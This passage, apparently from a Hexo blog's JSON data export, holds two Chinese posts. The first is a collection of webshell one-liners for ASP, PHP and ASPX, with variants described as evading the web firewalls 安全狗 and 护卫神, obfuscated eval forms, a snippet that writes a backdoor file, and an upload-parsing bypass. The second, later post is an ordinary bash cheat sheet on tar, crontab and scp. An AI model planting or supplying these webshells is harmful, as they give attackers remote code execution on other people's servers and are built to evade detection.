class=\"headerlink\" title=\"那些一句话\"></a>那些一句话</h1><h2 id=\"asp一句话木马\"><a href=\"#asp一句话木马\" class=\"headerlink\" title=\"asp一句话木马\"></a>asp一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%eval request(&quot;x&quot;)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"php一句话木马\"><a href=\"#php一句话木马\" class=\"headerlink\" title=\"php一句话木马\"></a>php一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php eval($_POST[g]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"aspx一句话\"><a href=\"#aspx一句话\" class=\"headerlink\" title=\"aspx一句话\"></a>aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"数据库加密一句话-密码a\"><a href=\"#数据库加密一句话-密码a\" class=\"headerlink\" title=\"数据库加密一句话(密码a)\"></a>数据库加密一句话(密码a)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure>\n<h2 id=\"网站配置、版权信息专用一句话\"><a href=\"#网站配置、版权信息专用一句话\" class=\"headerlink\" title=\"网站配置、版权信息专用一句话\"></a>网站配置、版权信息专用一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&quot;%&gt;&lt;%Eval Request(x)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"一句话再过护卫神\"><a href=\"#一句话再过护卫神\" class=\"headerlink\" title=\"一句话再过护卫神\"></a>一句话再过护卫神</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"过拦截一句话木马\"><a href=\"#过拦截一句话木马\" class=\"headerlink\" title=\"过拦截一句话木马\"></a>过拦截一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"asp闭合型一句话\"><a href=\"#asp闭合型一句话\" class=\"headerlink\" title=\"asp闭合型一句话\"></a>asp闭合型一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%</div></pre></td></tr></table></figure>\n<h2 id=\"能过安全狗的解析格式\"><a href=\"#能过安全狗的解析格式\" class=\"headerlink\" title=\"能过安全狗的解析格式\"></a>能过安全狗的解析格式</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的一句话\"><a href=\"#突破安全狗的一句话\" class=\"headerlink\" title=\"突破安全狗的一句话\"></a>突破安全狗的一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"elong过安全狗的php一句话\"><a href=\"#elong过安全狗的php一句话\" class=\"headerlink\" title=\"elong过安全狗的php一句话\"></a>elong过安全狗的php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"后台常用写入php一句话（密码x）\"><a href=\"#后台常用写入php一句话（密码x）\" class=\"headerlink\" title=\"后台常用写入php一句话（密码x）\"></a>后台常用写入php一句话（密码x）</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;? </div><div class=\"line\"> $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); </div><div class=\"line\"> @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\\r\\n\\r\\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\\r\\n\\r\\n?&quot;.&quot;&gt;\\r\\n&quot;); </div><div class=\"line\"> @fclose($fp); </div><div class=\"line\"> ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"高强度php一句话\"><a href=\"#高强度php一句话\" class=\"headerlink\" title=\"高强度php一句话\"></a>高强度php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"新型变异PHP一句话-密码b4dboy\"><a href=\"#新型变异PHP一句话-密码b4dboy\" class=\"headerlink\" title=\"新型变异PHP一句话(密码b4dboy)\"></a>新型变异PHP一句话(密码b4dboy)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的aspx一句话\"><a href=\"#突破安全狗的aspx一句话\" class=\"headerlink\" title=\"突破安全狗的aspx一句话\"></a>突破安全狗的aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;</div><div class=\"line\">&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"突破护卫神，保护盾一句话\"><a href=\"#突破护卫神，保护盾一句话\" class=\"headerlink\" title=\"突破护卫神，保护盾一句话\"></a>突破护卫神，保护盾一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);</div><div class=\"line\">$a($_POST[&quot;test&quot;]); ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"PHP高强度一句话：\"><a href=\"#PHP高强度一句话：\" class=\"headerlink\" title=\"PHP高强度一句话：\"></a>PHP高强度一句话：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<p>菜刀连接：<code>/x.php?x=lostwolf</code>  脚本类型：php  密码：c<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"aspx过狗\"><a href=\"#aspx过狗\" class=\"headerlink\" title=\"aspx过狗\"></a>aspx过狗</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;</div></pre></td></tr></table></figure>\n<h1 id=\"那些神器\"><a href=\"#那些神器\" class=\"headerlink\" title=\"那些神器\"></a>那些神器</h1><ul>\n<li>Sqlmap</li>\n</ul>\n"},{"title":"常用Bash命令总结","id":"10","updated":"2016-08-06T10:15:29.000Z","date":"2016-08-05T23:36:19.000Z","_content":"\n自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：\n\n<!-- more --> \n\n##  日常\n* ` ctrl + a ` #命令跳转到句首\n* `ctrl + r` #命令搜索模式\n* `TAB` #命令自动补全\n* `pwd` #显示当前路径\n* `tar -cvf mytest.tar mytest/ ` #对mytest目录打包\n* `tar -xvf mytest.tar ` #解压tar文件\n* `tar -xvf mytest.tar -C /opt/setups/` #解压到特殊目录\n* `find / -name *.conf` #查找/下的所有conf文件\n* `du -sh ./*` #查看当前文件夹下的空间占用情况\n* `more` #分页查看\n* `which` #查看目录\n* `locate` #快速搜索\n\n## 安全\n* `who` #当前登录情况\n* `last` #最近登录情况\n* `cat /etc/passwd |awk -F \\: '{print $1}'` #系统所有用户\n* `chkconfig` #启动项检查\n* `netstat -lnp` #端口情况\n* `uptime` #系统开机多久了\n* `sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT ` #允许访问 80 端口\n\n## 一句话命令\n脚本中切换用户\n```bash\nsu - test -c \"pwd\"\n```\n\n连接到你服务器端口的ip\n```bash\nnetstat -tun|grep 7890|sort|awk '{print $5}'|cut -d : -f 1|uniq \n```\n## 常用功能\n## #定时任务\n使用-l参数列出crontab文件:\n```bash\ncrontab -l\n```\n编辑crontab文件\n```bash\ncrontab -e\n```\n实例1：每1分钟执行一次myCommand\n```bash\n* * * * * myCommand\n```\n实例2：每小时的第3和第15分钟执行\n```bash\n3,15 * * * * myCommand\n```\n实例3：在上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * * myCommand\n```\n实例4：每隔两天的上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 */2  *  * myCommand\n```\n实例5：每周一上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * 1 myCommand\n```\n实例6：每晚的21:30重启smb\n```bash\n30 21 * * * /etc/init.d/smb restart\n```\n实例7：每月1、10、22日的4 : 45重启smb\n```bash\n45 4 1,10,22 * * /etc/init.d/smb restart\n```\n实例8：每周六、周日的1 : 10重启smb\n```bash\n10 1 * * 6,0 /etc/init.d/smb restart\n```\n实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb\n```bash\n0,30 18-23 * * * /etc/init.d/smb restart\n```\n实例10：每星期六的晚上11 : 00 pm重启smb\n```bash\n0 23 * * 6 /etc/init.d/smb restart\n```\n实例11：每一小时重启smb\n```bash\n* */1 * * * /etc/init.d/smb restart\n```\n实例12：晚上11点到早上7点之间，每隔一小时重启smb\n```bash\n* 23-7/1 * * * /etc/init.d/smb restart\n```\n## #scp\n实例1：从远处复制文件到本地目录\n```bash\nscp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中\n\n实例2：从远处复制到本地\n```bash\nscp -r root@10.6.159.147:/opt/soft/test /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。\n\n实例3：上传本地文件到远程机器指定目录\n```bash\nscp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest\n```\n说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录\n\n实例4：上传本地目录到远程机器指定目录\n```bash\nscp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest\n```\n说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中\n\n","source":"_posts/常用Bash命令总结.md","raw":"---\ntitle: 常用Bash命令总结\ntags: 'Linux'\npermalink: bash\nid: 10\nupdated: '2016-08-06 11:15:29'\ndate: 2016-08-06 00:36:19\n---\n\n自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：\n\n<!-- more --> \n\n##  日常\n* ` ctrl + a ` #命令跳转到句首\n* `ctrl + r` #命令搜索模式\n* `TAB` #命令自动补全\n* `pwd` #显示当前路径\n* `tar -cvf mytest.tar mytest/ ` #对mytest目录打包\n* `tar -xvf mytest.tar ` #解压tar文件\n* `tar -xvf mytest.tar -C /opt/setups/` #解压到特殊目录\n* `find / -name *.conf` #查找/下的所有conf文件\n* `du -sh ./*` #查看当前文件夹下的空间占用情况\n* `more` #分页查看\n* `which` #查看目录\n* `locate` #快速搜索\n\n## 安全\n* `who` #当前登录情况\n* `last` #最近登录情况\n* `cat /etc/passwd |awk -F \\: '{print $1}'` #系统所有用户\n* `chkconfig` #启动项检查\n* `netstat -lnp` #端口情况\n* `uptime` #系统开机多久了\n* `sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT ` #允许访问 80 端口\n\n## 一句话命令\n脚本中切换用户\n```bash\nsu - test -c \"pwd\"\n```\n\n连接到你服务器端口的ip\n```bash\nnetstat -tun|grep 7890|sort|awk '{print $5}'|cut -d : -f 1|uniq \n```\n## 常用功能\n## #定时任务\n使用-l参数列出crontab文件:\n```bash\ncrontab -l\n```\n编辑crontab文件\n```bash\ncrontab -e\n```\n实例1：每1分钟执行一次myCommand\n```bash\n* * * * * myCommand\n```\n实例2：每小时的第3和第15分钟执行\n```bash\n3,15 * * * * myCommand\n```\n实例3：在上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * * myCommand\n```\n实例4：每隔两天的上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 */2  *  * myCommand\n```\n实例5：每周一上午8点到11点的第3和第15分钟执行\n```bash\n3,15 8-11 * * 1 myCommand\n```\n实例6：每晚的21:30重启smb\n```bash\n30 21 * * * /etc/init.d/smb restart\n```\n实例7：每月1、10、22日的4 : 45重启smb\n```bash\n45 4 1,10,22 * * /etc/init.d/smb restart\n```\n实例8：每周六、周日的1 : 10重启smb\n```bash\n10 1 * * 6,0 /etc/init.d/smb restart\n```\n实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb\n```bash\n0,30 18-23 * * * /etc/init.d/smb restart\n```\n实例10：每星期六的晚上11 : 00 pm重启smb\n```bash\n0 23 * * 6 /etc/init.d/smb restart\n```\n实例11：每一小时重启smb\n```bash\n* */1 * * * /etc/init.d/smb restart\n```\n实例12：晚上11点到早上7点之间，每隔一小时重启smb\n```bash\n* 23-7/1 * * * /etc/init.d/smb restart\n```\n## #scp\n实例1：从远处复制文件到本地目录\n```bash\nscp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中\n\n实例2：从远处复制到本地\n```bash\nscp -r root@10.6.159.147:/opt/soft/test /opt/soft/\n```\n说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。\n\n实例3：上传本地文件到远程机器指定目录\n```bash\nscp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest\n```\n说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录\n\n实例4：上传本地目录到远程机器指定目录\n```bash\nscp -r /opt/soft/test root@10.6.159.147:/opt/soft/scptest\n```\n说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中\n\n","slug":"bash","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xpn00435es54ptyu68i","content":"<p>自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：</p>\n<a id=\"more\"></a> \n<h2 id=\"日常\"><a href=\"#日常\" class=\"headerlink\" title=\"日常\"></a>日常</h2><ul>\n<li><code>ctrl + a</code> #命令跳转到句首</li>\n<li><code>ctrl + r</code> #命令搜索模式</li>\n<li><code>TAB</code> #命令自动补全</li>\n<li><code>pwd</code> #显示当前路径</li>\n<li><code>tar -cvf mytest.tar mytest/</code> #对mytest目录打包</li>\n<li><code>tar -xvf mytest.tar</code> #解压tar文件</li>\n<li><code>tar -xvf mytest.tar -C /opt/setups/</code> #解压到特殊目录</li>\n<li><code>find / -name *.conf</code> #查找/下的所有conf文件</li>\n<li><code>du -sh ./*</code> #查看当前文件夹下的空间占用情况</li>\n<li><code>more</code> #分页查看</li>\n<li><code>which</code> #查看目录</li>\n<li><code>locate</code> #快速搜索</li>\n</ul>\n<h2 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h2><ul>\n<li><code>who</code> #当前登录情况</li>\n<li><code>last</code> #最近登录情况</li>\n<li><code>cat /etc/passwd |awk -F \\: &#39;{print $1}&#39;</code> #系统所有用户</li>\n<li><code>chkconfig</code> #启动项检查</li>\n<li><code>netstat -lnp</code> #端口情况</li>\n<li><code>uptime</code> #系统开机多久了</li>\n<li><code>sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</code> #允许访问 80 端口</li>\n</ul>\n<h2 id=\"一句话命令\"><a href=\"#一句话命令\" class=\"headerlink\" title=\"一句话命令\"></a>一句话命令</h2><p>脚本中切换用户<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">su - <span class=\"built_in\">test</span> -c <span class=\"string\">\"pwd\"</span></div></pre></td></tr></table></figure></p>\n<p>连接到你服务器端口的ip<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">netstat -tun|grep 7890|sort|awk <span class=\"string\">'&#123;print $5&#125;'</span>|cut <span class=\"_\">-d</span> : <span class=\"_\">-f</span> 1|uniq</div></pre></td></tr></table></figure></p>\n<h2 id=\"常用功能\"><a href=\"#常用功能\" class=\"headerlink\" title=\"常用功能\"></a>常用功能</h2><h2 id=\"定时任务\"><a href=\"#定时任务\" class=\"headerlink\" title=\"#定时任务\"></a>#定时任务</h2><p>使用-l参数列出crontab文件:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-l</span></div></pre></td></tr></table></figure></p>\n<p>编辑crontab文件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-e</span></div></pre></td></tr></table></figure></p>\n<p>实例1：每1分钟执行一次myCommand<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例2：每小时的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例3：在上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 */2  *  * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例5：每周一上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * 1 myCommand</div></pre></td></tr></table></figure></p>\n<p>实例6：每晚的21:30重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">30 21 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例7：每月1、10、22日的4 : 45重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">45 4 1,10,22 * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例8：每周六、周日的1 : 10重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">10 1 * * 6,0 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0,30 18-23 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例10：每星期六的晚上11 : 00 pm重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0 23 * * 6 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例11：每一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* */1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例12：晚上11点到早上7点之间，每隔一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* 23-7/1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<h2 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"#scp\"></a>#scp</h2><p>实例1：从远处复制文件到本地目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中</p>\n<p>实例2：从远处复制到本地<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r root@10.6.159.147:/opt/soft/<span class=\"built_in\">test</span> /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。</p>\n<p>实例3：上传本地文件到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录</p>\n<p>实例4：上传本地目录到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r /opt/soft/<span class=\"built_in\">test</span> root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中</p>\n","excerpt":"<p>自从入了Mac后，感觉敲命令更加方便了，对于我这种半吊子青年，一直号称不会写脚本的前端不是好美工，总结了一些命令，仅供参考，省去了最简单的命令，不过部分也比较简单：</p>","more":"<h2 id=\"日常\"><a href=\"#日常\" class=\"headerlink\" title=\"日常\"></a>日常</h2><ul>\n<li><code>ctrl + a</code> #命令跳转到句首</li>\n<li><code>ctrl + r</code> #命令搜索模式</li>\n<li><code>TAB</code> #命令自动补全</li>\n<li><code>pwd</code> #显示当前路径</li>\n<li><code>tar -cvf mytest.tar mytest/</code> #对mytest目录打包</li>\n<li><code>tar -xvf mytest.tar</code> #解压tar文件</li>\n<li><code>tar -xvf mytest.tar -C /opt/setups/</code> #解压到特殊目录</li>\n<li><code>find / -name *.conf</code> #查找/下的所有conf文件</li>\n<li><code>du -sh ./*</code> #查看当前文件夹下的空间占用情况</li>\n<li><code>more</code> #分页查看</li>\n<li><code>which</code> #查看目录</li>\n<li><code>locate</code> #快速搜索</li>\n</ul>\n<h2 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h2><ul>\n<li><code>who</code> #当前登录情况</li>\n<li><code>last</code> #最近登录情况</li>\n<li><code>cat /etc/passwd |awk -F \\: &#39;{print $1}&#39;</code> #系统所有用户</li>\n<li><code>chkconfig</code> #启动项检查</li>\n<li><code>netstat -lnp</code> #端口情况</li>\n<li><code>uptime</code> #系统开机多久了</li>\n<li><code>sudo iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT</code> #允许访问 80 端口</li>\n</ul>\n<h2 id=\"一句话命令\"><a href=\"#一句话命令\" class=\"headerlink\" title=\"一句话命令\"></a>一句话命令</h2><p>脚本中切换用户<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">su - <span class=\"built_in\">test</span> -c <span class=\"string\">\"pwd\"</span></div></pre></td></tr></table></figure></p>\n<p>连接到你服务器端口的ip<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">netstat -tun|grep 7890|sort|awk <span class=\"string\">'&#123;print $5&#125;'</span>|cut <span class=\"_\">-d</span> : <span class=\"_\">-f</span> 1|uniq</div></pre></td></tr></table></figure></p>\n<h2 id=\"常用功能\"><a href=\"#常用功能\" class=\"headerlink\" title=\"常用功能\"></a>常用功能</h2><h2 id=\"定时任务\"><a href=\"#定时任务\" class=\"headerlink\" title=\"#定时任务\"></a>#定时任务</h2><p>使用-l参数列出crontab文件:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-l</span></div></pre></td></tr></table></figure></p>\n<p>编辑crontab文件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">crontab <span class=\"_\">-e</span></div></pre></td></tr></table></figure></p>\n<p>实例1：每1分钟执行一次myCommand<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例2：每小时的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 * * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例3：在上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 */2  *  * myCommand</div></pre></td></tr></table></figure></p>\n<p>实例5：每周一上午8点到11点的第3和第15分钟执行<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">3,15 8-11 * * 1 myCommand</div></pre></td></tr></table></figure></p>\n<p>实例6：每晚的21:30重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">30 21 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例7：每月1、10、22日的4 : 45重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div 